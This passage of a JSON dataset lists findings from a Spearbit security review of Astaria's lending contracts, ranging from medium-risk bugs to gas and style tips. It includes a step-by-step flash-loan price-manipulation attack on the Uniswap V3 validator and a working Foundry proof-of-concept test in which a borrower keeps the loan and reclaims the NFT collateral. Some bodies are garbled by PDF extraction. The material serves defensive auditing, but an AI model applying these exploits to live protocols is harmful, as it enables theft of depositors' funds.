        "body": "UNI_V3Validator.validateAndParse() checks the state of the Uniswap V3 position. This includes checking the LP value through LiquidityAmounts.getAmountsForLiquidity. //get pool state //get slot 0 (uint160 poolSQ96, , , , , , ) = IUniswapV3PoolState( V3_FACTORY.getPool(token0, token1, fee) ).slot0(); (uint256 amount0, uint256 amount1) = LiquidityAmounts .getAmountsForLiquidity( poolSQ96, TickMath.getSqrtRatioAtTick(tickLower), TickMath.getSqrtRatioAtTick(tickUpper), liquidity );  LiquidityAmounts.sol#L177-L221 When we deep dive into getAmountsForLiquidity, we see three cases. Price is below the range, price is within the range, and price is above the range. 28 function getAmountsForLiquidity( uint160 sqrtRatioX96, uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount0, uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); if (sqrtRatioX96 <= sqrtRatioAX96) { amount0 = getAmount0ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } else if (sqrtRatioX96 < sqrtRatioBX96) { amount0 = getAmount0ForLiquidity( sqrtRatioX96, sqrtRatioBX96, liquidity ); amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioX96, liquidity ); } else { amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } } } For simplicity, we can break into getAmount1ForLiquidity 29 /// @notice Computes the amount of token1 for a given amount of liquidity and a price range /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary /// @param liquidity The liquidity being valued /// @return amount1 The amount of token1 function getAmount1ForLiquidity( uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); return FullMathUniswap.mulDiv( liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96 ); } } is calculated as amount = liquidity * (upper price - lower price). When the We find the amount slot0.poolSQ96 is in lp range, the lower price is the slot0.poolSQ96, the closer slot0 is to lowerTick, the smaller the amount1 is. This is vulnerable to price manipulation attacks as IUniswapV3PoolState.slot0.poolSQ96 is effectively the spot price. Attackers can acquire huge funds through flash loans and shift theslot0 by doing large swaps on Uniswap. Assume the following scenario, the strategist sign a lien that allows the borrower to provide ETH-USDC position with > 1,000,000 USDC and borrow 1,000,000 USDC from the vault.  Attacker can first provides 1 ETH worth of lp at price range 2,000,000 ~ 2,000,001.  The attacker borrows flash loan to manipulate the price of the pool and now the slot0.poolSQ96 = sqrt(2,000,000). (ignoring the decimals difference.  getAmountsForLiquidity value the LP positions with the spot price, and find the LP has 1 * 2,000,000 USDC in the position. The attacker borrows 2,000,000  Restoring the price of Uniswap pool and take the profit to repay the flash loan. Note that the project team has stated clearly that UNI_V3Validator will not be used before the audit. This issue is filed to provide information to the codebase.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Users pay protocol fee for interests they do not get",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The PublicVault._handleStrategistInterestReward() function currently charges a protocol fee from minting vault shares, affecting all vault LP participants. However, not every user receives interest payments. Consequently, a scenario may arise where a user deposits funds into the PublicVault before a loan is repaid, resulting in the user paying more in protocol fees than the interest earned. This approach appears to be unfair to certain users, leading to a disproportionate fee structure for those who do not benefit from the interest rewards.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Seaport auctions not compatible with USDT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "As per ERC20 specification, approve() returns a boolean function approve(address _spender, uint256 _value) public returns (bool success) However, USDT deviates from this standard and it's approve() method doesn't have a return value. Hence, if USDT is used as a payment token, the following line reverts in validateOrder() as it expects return data but doesn't receive it: paymentToken.approve(address(transferProxy), s.LIEN_TOKEN.getOwed(stack));",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Borrowers cannot provide slippage protection parameters when committing to a lien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a borrower commits to a lien, AstariaRouter calls the strategy validator to fetch the lien details (bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator( strategyValidator ).validateAndParse( commitment.lienRequest, msg.sender, commitment.tokenContract, commitment.tokenId ); details include rate, duration, liquidationInitialAsk: struct Details { uint256 maxAmount; uint256 rate; //rate per second uint256 duration; uint256 maxPotentialDebt; // not used anymore uint256 liquidationInitialAsk; } The borrower cannot provide slippage protection parameters to make sure these 3 values cannot enter into some undesired ranges.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The liquidation's auction starting price is not chosen perfectly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a lien is expired and liquidated the starting price for its Seaport auction is chosen as stack.lien.details.liquidationInitialAs. It would make more sense to have the startingPrice to be the maximum of the amount owed up to now and the stack.lien.details.liquidationInitialAsk ps = max(Lin, aowed ) For example if the liquidate(...) endpoint is called way after the lien's expiration time the amount owed might be bigger than the stack.lien.details.liquidationInitialAsk. When a lien is created the protocol checks that stack.lien.details.liquidationInitialAsk is not smaller than the to-be-owed amount at the end of the lien's term. But the lien can keep accruing interest if it is not liquidated right away when it gets expired.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Canceled Seaport auctions can still be claimed by the liquidator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Canceled auctions can still be claimed by the liquidator if ( s.idToUnderlying[collateralId].auctionHash != s.SEAPORT.getOrderHash(getOrderComponents(params, counterAtLiquidation)) ) { //revert auction params don't match revert InvalidCollateralState( InvalidCollateralStates.INVALID_AUCTION_PARAMS ); } If in the future we would add an authorised endpoint that could call s.SEAPORT.incrementCounter() to cancel all outstanding NFT auctions, the liquidator can call this endpoint liquidatorNFTClaim(..., counterAtLiq- uidation) where counterAtLiquidation is the old counter to claim its NFT after the canceled Seaport auction ends.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The risk of bad debt is transferred to the non-redeeming shareholders and not the redeeming holders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Right before a successful epochProcess(), the total assets A equals to + P(s,tl )2U2 a(s, tl ) A = y0 + s(t (cid:0) tlast ) = B + a(s, t) X s2U1 All the parameter values in the below table are considered as just before calling the processEpoch() endpoint unless stated otherwise.  A | totalAssets() |  y0 | yIntercept |  s | slope |  tlast | lasttimestamp used to update y0 or s |  t | block.timestamp |  B | ERC20(asset()).balanceOf(PublicVault), underlying balance of the public vault |  U1 | The set of active liens/stacks owned by the PublicVault, this can be non-empty due to how long the lien durations can be |  U2 | The set of liquidated liens/stacks and their corresponding liquidation timestamp ( tl ) which are owned by the current epoch's WithdrawProxy Wecurr . These liens belong to the current epoch, but their auction ends in the next epoch duration. |  a(s, t) | total amount owned by the stack s up to the timestamp t.  S | totalSupply().  SW | number of shares associated with the current epoch's WithdrawProxy ,currentWithdrawProxy.totalSupply() |  E | currentWithdrawProxy.getExpected(). 35 0 | yIntercept after calling epochProcess().  wr | withdrawReserve this is the value after calling epochProcess().  y 0  tp | last after calling epochProcess().  A0 | totalAssets after calling epochProcess().  Wn | the current epoch's WithdrawProxy before calling epochProcess().  Wn+1 | the current epoch's WithdrawProxy after calling epochProcess(). Also assume that claim() was already called on the previous epoch's WithdrawProxy if needed. After the call to epochProcess() (in the same block), we would have roughly (not considering the division errors) A0 = y 0 0 + s(t (cid:0) tp) A0 = (1 (cid:0) SW S )A + X s2U1 (a(s, t) (cid:0) a(s, tp)) wr = ( SW S ) B + a(s, tp) X s2U1 A = A0 + wr + ( SW S ) X (s,tl )2U2 a(s, tl ) (cid:0)(cid:1)A = wr + ( SW S )E and so: To be able to call processEpoch() again we need to make sure wr tokens have been transferred to Wn either from the public vault's assets B or from Wn+1 assets. Note that at this point wr equals to wr = SW S B + SW S X s2U1 a(s, tp) SW S B is an actual asset and can be transferred to Wn right away. The The a(s, tp) portion is a percentage of the amount owed by active liens at the time the processEpoch() was called. Depending on whether these liens get paid fully or not we would have: SW S Ps2U1  If they get fully paid there are no risks for the future shareholders to bare.  If these liens are not fully paid since we have transferred a(s, tp) from the actual asset balance to Wn the redeeming shareholder would not take the risk of these liens getting liquidated for less than their value. But these risks are transferred to the upcoming shareholders or the shareholders who have not redeemed their positions yet. SW S Ps2U1",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "validateOrder(...) does not check the consideration amount against its token balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a lien position gets liquidated the CollateralToken creates a full restricted Seaport auction with itself as both the offerer and the zone. This will cause Seaport to do a callback to the CollateralToken's validateOrder(...) endpoint at the end of order fulfilment/matching. In this endpoint we have: uint256 payment = zoneParameters.consideration[0].amount; This payment amount is not validated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "If the auction window is 0, the borrower can keep the lien amount and also take back its collater- alised NFT token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "If an authorised entity would file to set the auctionWindow to 0, borrowers can keep their lien amount and also take back their collateralised NFT tokens. Below is how this type of vulnerability works. 1. A borrower takes a lien from a vault by collateralising its NFT token. 2. Borrower let the time pass so that its lien/stack position can be liquidated. 3. The borrower atomically liquidates and then calls the liquidatorNFTClaim(...) endpoint of the Collater- alToken. The timestamps are as follows: s (cid:20) t lien t lien e = t auction s = t auction e We should note that in step 3 above when the borrower liquidates its own position, the CollateralToken creates a Seaport auction by calling its validate(...) endpoint. But this endpoint does not validate the orders timestamps so even though the timestamps provided are not valid when one tries to fulfil/match the order since Seaport requires that t auction . Thus, in . So it is not possible to fulfil/match an order where t auction (cid:20) tnow < t auction = t auction e e s s 37 step 3 it is not needed to call liquidatorNFTClaim(...) immediately as the auction created cannot be fulfilled by anyone. // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol function _createUser(uint256 pk, string memory label) internal returns(address addr) { uint256 ownerPK = uint256(pk); addr = vm.addr(ownerPK); vm.label(addr, label); } function testScenario14() public { // allow flash liens - liens that can be liquidated in the same block that was committed IAstariaRouter.File[] memory files = new IAstariaRouter.File[](1); files[0] = IAstariaRouter.File( IAstariaRouter.FileType.AuctionWindow, abi.encode(uint256(0)) ); ASTARIA_ROUTER.fileBatch(files); console2.log(\"[+] set auction window to 0.\"); { } { address borrower1 = _createUser(0xb055033501, \"borrower1\"); address vaultOwner = _createUser(0xa77ac3, \"vaultOwner\"); address publicVault = _createPublicVault(vaultOwner, vaultOwner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); console2.log(\"vault start: %s\", IPublicVault(publicVault).START()); skip(14 days); _lendToVault( Lender({addr: vaultOwner, amountToLend: 10 ether}), payable(publicVault) ); TestNFT nft1 = new TestNFT(1); address tokenContract1 = address(nft1); uint256 tokenId1 = uint256(0); nft1.transferFrom(address(this), borrower1, tokenId1); vm.startPrank(borrower1); (uint256 lienId,ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: vaultOwner, strategistPK: 0xa77ac3, tokenContract: tokenContract1, tokenId: tokenId1, lienDetails: ILienToken.Details({ maxAmount: 2 ether, rate: 1e8, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 10 ether }), amount: 2 ether, 38 revertMessage: \"\" }); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); skip(1 hours); console2.log(\"[+] lien created with 0 duration. lineId: %s\", lienId); OrderParameters memory params = _liquidate(stack); console2.log(\"[+] lien liquidated by the borrower.\"); COLLATERAL_TOKEN.liquidatorNFTClaim( stack, params, COLLATERAL_TOKEN.SEAPORT().getCounter(address(COLLATERAL_TOKEN)) ); console2.log(\"[+] liquidator/borrower claimed NFT.\\n\"); vm.stopPrank(); console2.log(\"owner of the NFT token: %s\", nft1.ownerOf(tokenId1)); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); assertEq( nft1.ownerOf(tokenId1), borrower1, \"the borrower should own the NFT\" ); assertEq( borrower1.balance, 2 ether, \"borrower should still have the lien amount.\" ); } } forge t --mt testScenario14 --ffi -vvv: [+] set auction window to 0. [+] public vault is created: 0x4430c0731d87768Bf65c60340D800bb4B039e2C4 vault start: 1 ETH balance of the borrower: 2000000000000000000 [+] lien created with 0 duration. lineId: ,! [+] lien liquidated by the borrower. [+] liquidator/borrower claimed NFT. 91310819262208864484407122336131134788367087956387872647527849353935417268035 owner of the NFT token: 0xA92D072d39E6e0a584a6070a6dE8D88dfDBae2C7 ETH balance of the borrower: 2000000000000000000",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "An owner might not be able to cancel all signed liens by calling incrementNonce()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "If the vault owner or the delegate is phished into signing terms with consecutive nonces in a big range, they would not be able to cancel all those terms with the current incrementNonce() implementation as this value is only incrementing the nonce one at a time. As an example Seaport increments their counters using the following formula n += blockhash(block.number - 1) << 0x80;",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Error handling for USDT transactions in TransferProxy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "To handle edge cases where the receiver is blacklisted, TransferProxy.tokenTransferFromWithErrorReceiver(...) is designed to catch errors that may occur during the first transfer attempt and then proceed to send the tokens to the error receiver. try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } However, it's worth noting that this approach may not be compatible with non-standard ERC20 tokens (e.g., USDT) that do not return any value after a transferFrom operation. The try-catch pattern in Solidity can only catch errors resulting from reverted external contract calls, but it does not handle errors caused by inconsistent return values. Consequently, when using USDT, the entire transaction will revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PublicVault does not handle funds in errorReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "involves PROXY.tokenTransferFromWithErrorReceiver. The implementation in the TransferProxy contract involves sending the tokens to an error receiver that is con- trolled by the original receiver. However, this approach can lead to accounting errors in the PublicVault as PublicVault does not pull tokens from the error receiver. process transferProxy.TRANSFER_- LienToken.MakePayment(...), function from the in the tokens using user the to function tokenTransferFromWithErrorReceiver( // ... ) { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Note that, in practice, tokens would not be transferred to the error receiver. The issue is hence considered to be a low-risk issue.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent Vault Fee Charging during Loan Liquidation via WithdrawProxy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In the smart contract code of PublicVault, there is an inconsistency related to the charging of fees when a loan is liquidated at epoch's roll and the lien is sent to WithdrawProxy. The PublicVault.owner is supposed to take a ratio of the interest paid as the strategist's reward, and the fee should be charged when a payment is made in the function PublicVault.updateVault(...), regardless of whether it's a normal payment or a liquidation payment. It appears that the fee is not being charged when a loan is liquidated at epoch's roll and the lien is sent to With- drawProxy. This discrepancy could potentially lead to an inconsistent distribution of fees and rewards.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "VaultImplementation.init(...) silently initialised when the allowlist parameters are not throughly validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In VaultImplementation.init(...), if params.allowListEnabled is false but params.allowList is not empty, s.allowList does not get populated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Several functions in AstariaRouter can be made non-payable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Following functions in AstariaRouter are payable when they should never be sent the native token: mint(), deposit(), withdraw(), redeem(), pullToken()",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Loan duration can be reduced at the time of borrowing without user permission",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Requested loan duration, if greater than the maximum allowed duration (the time to next epoch's end), is set to this maximum value: if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } This happens without explicit user permission.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Native tokens sent to DepositHelper can get locked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "DepositHelper has the following two endpoints: fallback() external payable {} receive() external payable {} If one calls this contract by not supplying the deposit(...) function signature, the msg.value provided would get locked in this contract.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Updated ...EpochLength values are not validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Sanity check is missing for updated s.minEpochLength and s.maxEpochLength. Need to make sure s.minEpochLength <= s.maxEpochLength",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CollateralToken's conduit would have an open channel to an old Seaport when Seaport is updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "After filing for a new Seaport the old Seaport would still have an open channel to it from the Col- lateralToken's conduit (assuming the old and new Seaport share the same conduit controller).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CollateralToken's tokenURI uses the underlying assets's tokenURI",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Since the CollateralToken positions can be sold on secondary markets like OpenSea, the tokenURI endpoint should be customised to avoid misleading users and it should contain information relating to the Collat- eralToken and not just its underlying asset. It would also be great to pull information from its associated lien to include here.  What-is-OpenSea-s-copymint-policy.  docs.opensea.io/docs/metadata-standards.  Necromint got banned on OpenSea.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Filing to update one of the main contract for another main contract lacks validation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The main contracts AstariaRouter, CollateralToken, and LienToken all need to be aware of each other and form a connected triangle. They are all part of a single unit and perhaps are separated into 3 different contract due to code size and needing to have two individual ERC721 tokens. Their authorised filing structure is as follows:  Note that one cannot file for CollateralToken to change LienToken as the value of LienToken is only set during the CollateralToken's initialisation. If one files to change one of these nodes and forget to check or update the links between these contract, the triangle above would be broken.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TRANSFER_PROXY is not queried in a consistent fashion.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Different usages of TRANSFER_PROXY and how it is queried  AstariaRouter: Used in pullToken(...) to move tokens from the msg.sender to a another address.  CollateralToken: Used in validateOrder(...) where Seaport has callbacked into. Here Collateral- Token gives approval to TRANSFER_PROXY which is queried from AstariaRouter for the settlement tokens. TRANSFER_PROXY is also used to transfer tokens. 47  LienToken: In _payment(...) TRANSFER_PROXY is used to transfer tokens from CollateralToken to the lien owner. This implies that the TRANSFER_PROXY used in CollateralToken should be the same that is used in LienToken. Therefore, from the above we see that: 1. TRANSFER_PROXY holds tokens approvals for ERC20 or wETH tokens used as lien tokens. 2. TRANSFER_PROXY's address should be the same at all call sites for the different contract AstariaRouter, CollateralToken and LienToken. 3. Except CollateralToken which queries TRANSFER_PROXY from AstariaRouter, the other two contract As- tariaRouter and LienToken read this value from their storage. Note that the deployment script sets assigns the same TRANSFER_PROXY to all the 3 main contracts in the codebase AstariaRouter, CollateralToken, and LienToken.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Multicall when inherited to ERC4626RouterBase does not bubble up the reverts correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Multicall does not bubble up the reverts correctly. The current implementation uses the following snippet to bubble up the reverts // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/Multicall.sol pragma solidity >=0.7.6; if (!success) { // Next 5 lines from https://ethereum.stackexchange.com/a/83577 if (result.length < 68) revert(); assembly { result := add(result, 0x04) } revert(abi.decode(result, (string))); } 48 // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/ERC4626RouterBase.sol pragma solidity ^0.8.17; ... abstract contract ERC4626RouterBase is IERC4626RouterBase, Multicall { ... } This method of bubbling up does not work with new types of errors:  Panic(uint256) 0.8.0 (2020-12-16)  Custom errors introduced in 0.8.4 (2021-04-21)  ...",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cache VAULT().ROUTER().LIEN_TOKEN()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "leads to extra external calls.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "s.currentEpoch can be cached in processEpoch()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "s.currentEpoch is being read from the storage multiple times in the processEpoch().",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use basis points for ratios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "liquidatorNFTClaim()'s arguments can be made calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following arguments can be converted to calldata to save gas on copying them to memory: function liquidatorNFTClaim( ILienToken.Stack memory stack, OrderParameters memory params, uint256 counterAtLiquidation ) external whenNotPaused {",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "a.mulDivDown(b,1) is equivalent to a*b",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Highlighted code below the pattern of a.mulDivDown(b, 1) which is equivalent to a*b except the revert parameters in case of an overflow return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "try/catch can be removed for simplicity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following code catches a revert in the external call WETH.deposit{value: owning}() and then reverts itself in the catch clause try WETH.deposit{value: owing}() { WETH.approve(transferProxy, owing); // make payment lienToken.makePayment(stack); // check balance if (address(this).balance > 0) { // withdraw payable(msg.sender).transfer(address(this).balance); } } catch { revert(); } This effect can also be achieved without using try/catch which simplifies the code too.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache s.idToUnderlying[collateralId].auctionHash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In liquidatorNFTClaim(...), s.idToUnderlying[collateralId].auctionHash is read twice from the storage.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache keccak256(abi.encode(stack))",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In LienToken._handleLiquidation(...) lienId is calculated as uint256 lienId = uint256(keccak256(abi.encode(stack))); Note that _handleLiquidation(...) is called by handleLiquidation(...) which has a modifier validateCol- lateralState(...): validateCollateralState( stack.lien.collateralId, keccak256(abi.encode(stack)) ) And thus keccak256(abi.encode(stack)) is performed twice. The same multiple hashing calculation also hap- pens in makePayment(...) flow. to cache the keccak256(abi.encode(stack)) value for the above",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functions can be made view or pure",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Several functions can be view or pure. Compiler also warns about these functions. For instance, _validateRequest() can be made view. getSeaportMetadata() can be made pure instead of view.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix compiler generated warnings for unused arguments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Several functions have arguments which are not used and compiler generates a warning for each instance, cluttering the output. This makes it easy to miss useful warnings. Here is one example of a function with unused arguments: function deposit( uint256 assets, address receiver ) { } public virtual override(ERC4626Cloned, IERC4626) onlyVault returns (uint256 shares) revert NotSupported();",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Non-lien NFT tokens can get locked in the vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Both public and private vault when their onERC721Received(...) is called they return the IERC721Receiver.onERC721Received.selector and perform extra logic if the msg.sender is the LienToken and the operator is the AstariaRouter. This means other NFT tokens (other than lien tokens) received by a vault will be locked.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Validation checks should be performed at the beginning of processEpoch()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following validation check for the data corresponding to the current epoch happens in the middle of processEpoch() where there have already been some accounting done: if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) { revert InvalidVaultState( InvalidVaultStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO ); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define and onlyOwner modifier for VaultImplementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following require statement has been used multiple times require(msg.sender == owner());",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Vault is missing an interface",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Vault is missing an interface",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "RepaymentHelper.makePayment(...) transfer is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In RepaymentHelper.makePayment(...) the transfer function is used to return extra native tokens sent to this contract. The use of transfer which restrict the amount of gas shared with the msg.sender is not required, since there are no actions after this call site, it is safe to call the msg.sender directly to transfer these funds.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider importing Uniswap libraries directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "astaria-gpl copies the libraries highlighted above which were written originally in Solidity v0.7 and refactors them to v0.8. Uniswap has also provided these contracts for Solidity v0.8 in branches named 0.8. See v3-core@0.8 and v3-periphery@0.8. Using these files directly reduces the amount of code owned by Astaria.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Elements' orders are not consistent in solidity files",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Elements' orders are not consistent in solidity files",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "FileType definitions are not consistent",
